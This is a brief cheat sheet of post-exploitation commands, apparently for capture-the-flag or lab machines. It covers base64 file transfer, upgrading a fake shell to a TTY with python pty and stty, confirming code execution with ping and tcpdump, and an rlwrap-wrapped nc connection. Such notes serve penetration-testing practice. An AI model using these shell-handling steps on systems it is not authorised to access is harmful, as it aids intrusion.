## File moving (good for small binary)
```
base64 -w0 file
gedit file.b64
base64 -d file.b64 > file
```


## tty shell from fake shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo
export TERM=xterm
```

## Test code execution 
```
ping 10.10.10.10
tcpdump -i tun0 icmp 
```

## Allow arrow keys
```
rlwrap nc 10.10.10.10 123
```
